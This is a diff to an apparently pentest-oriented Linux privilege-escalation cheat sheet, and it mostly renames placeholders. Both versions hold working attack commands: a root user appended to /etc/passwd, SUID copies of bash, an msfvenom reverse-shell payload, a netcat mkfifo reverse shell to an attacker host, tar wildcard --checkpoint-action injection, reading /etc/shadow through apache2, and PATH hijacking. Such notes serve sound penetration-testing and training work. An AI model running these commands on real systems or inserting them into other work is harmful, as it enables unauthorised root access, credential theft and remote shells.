@@ -25,12 +25,12 @@
 ```
 openssl passwd <PASS> #generate password
 echo "root2:<OPENSSL OUTPUT>:0:0:root:/root:/bin/bash" >> /etc/passwd
-su root2 #sudo to root with the password set
+su root2
 ```
 
 #### 2. Copy /bin/bash and set suid bit
 ```
-cp /bin/bash /tmp/rootbash sh; chmod +s /temp/rootbash
+cp /bin/bash /tmp/rootbash sh; chmod +xs /temp/rootbash
 /tmp/rootbash -p
 ```
 
@@ -46,7 +46,7 @@ cp /bin/bash /tmp/rootbash sh; chmod +s /temp/rootbash
 
 #### 4. MSFVenom shell
 ```
-msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell.elf
+msfvenom -p linux/x86/shell_reverse_tcp LHOST=<ATTACKER IP> LPORT=<ATTACKER PORT> -f elf > shell.elf
 ```
 
 ## Tools
@@ -64,7 +64,7 @@ https://github.com/rebootuser/LinEnum
 
 ```
 ./linEnum.sh
-./linEnum.sh -k password -e export -t
+./linEnum.sh -k <PASSWORD> -e export -t
 ```
 
 ## Manual Enumeration
@@ -153,8 +153,8 @@ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
 #### Run SUID BIT
 Use the following instead of just sudo <PROGRAM>
 ```
-sudo -u root <PATH TO PROGRAM> #manier1
-./.suid_bash -p #manier2
+sudo -u root <PATH TO PROGRAM>
+./.<PROGRAM> -p 
 ```
 
 ## Privilege escalation techniques
@@ -232,10 +232,9 @@ sudo -u <USERNAME> <PROGRAM>
 - https://gtfobins.github.io/
 
 ### Apache2 trick
-apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand.
+apache2 doesn’t have any known shell escape sequences, however when parsing a given config file, it will error and print any line it doesn’t understand. 
 ```
 sudo apache2 -f /etc/shadow
-#use hashcat to crack the hashes
 ```
 
 ### Environment variables
@@ -316,7 +315,7 @@ cat /etc/crontab
 ```
 #!/bin/bash
 cp /bin/bash /tmp/rootbash
-chmod +s /tmp/rootbash
+chmod +xs /tmp/rootbash
 ```
   
 #### Ensure it executable
@@ -336,7 +335,7 @@ Exploiting wildcard for privilege escalation (For example tar * in this director
 
 #### Example2
 ```
-echo "mkfifo /tmp/lhennp; nc <IP> <PORT> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
+echo "mkfifo /tmp/lhennp; nc <ATTACKER IP> <ATTACKER PORT> 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp" > shell.sh
 echo "" > "--checkpoint-action=exec=sh shell.sh"
 echo "" > --checkpoint=1
 ```
@@ -509,7 +508,7 @@ If a binary has a SUID and doesn’t use full path for executing something, you 
 echo /bin/bash > /tmp/curl
 chmod 777 /tmp/curl
 export PATH=/tmp:$PATH
-<path to binary>
+<PATH TO BINARY>
 ```
 
 #### Man pages
